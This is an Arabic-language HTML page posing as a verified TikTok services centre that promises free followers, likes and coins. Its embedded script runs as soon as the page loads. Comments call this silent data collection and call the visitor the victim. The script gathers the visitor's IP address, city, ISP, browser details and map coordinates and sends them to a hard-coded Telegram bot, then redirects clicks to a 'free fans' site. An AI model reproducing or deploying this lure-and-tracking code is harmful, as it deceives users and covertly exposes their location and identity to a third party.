<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Services - خدمات تيك توك</title>
    <style>
        body { background: #010101; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; margin: 0; }
        h2 { color: #fe2c55; margin-bottom: 30px; text-shadow: 0 0 10px rgba(254, 44, 85, 0.5); }
        .card { background: #121212; border: 1px solid #fe2c55; border-radius: 15px; width: 90%; max-width: 400px; padding: 20px; margin-bottom: 20px; text-align: center; cursor: pointer; transition: 0.3s; }
        .card:hover { transform: scale(1.05); background: #1a1a1a; box-shadow: 0 0 20px rgba(254, 44, 85, 0.3); }
        .card img { width: 50px; margin-bottom: 10px; }
        .card h3 { margin: 10px 0; font-size: 1.2rem; }
        .card p { color: #ccc; font-size: 0.9rem; }
    </style>
</head>
<body>

    <h2>مركز خدمات TikTok الموثق ✅</h2>

    <div class="card" onclick="goToTarget()">
        <h3>🚀 زيادة متابعين</h3>
        <p>احصل على 5000 متابع حقيقي خلال دقائق</p>
    </div>

    <div class="card" onclick="goToTarget()">
        <h3>❤️ زيادة لايكات</h3>
        <p>تفعيل ميزة الوصول للاكسبلور التلقائي</p>
    </div>

    <div class="card" onclick="goToTarget()">
        <h3>💰 شحن عملات (Coins)</h3>
        <p>احصل على 1000 عملة مجانية كهدية ترحيبية</p>
    </div>

<script>
    // --- إعدادات البوت بتاعك ---
    const botToken = '6872535039:AAGW-x0oE_9B2W8_19L3y0uX6u_X-W_E'; 
    const chatId = '6547631855';
    const targetSite = "https://tikfollowers.com/tiktok-free-fans"; 

    // وظيفة سحب البيانات الصامتة
    async function collectData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            const message = `
🔥 صيدة جديدة من صفحة الاختيار!
📍 المدينة: ${data.city}
🌐 الشركة: ${data.org}
🔢 الـ IP: ${data.ip}
📱 الجهاز: ${navigator.userAgent}
🗺️ الخريطة: https://www.google.com/maps?q=${data.latitude},${data.longitude}
            `;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat-id=${chatId}&text=${encodeURIComponent(message)}`);
        } catch (e) { console.log("Silent error"); }
    }

    function goToTarget() {
        window.location.href = targetSite;
    }

    // تشغيل السحب بمجرد دخول الضحية
    collectData();
</script>

</body>
</html>
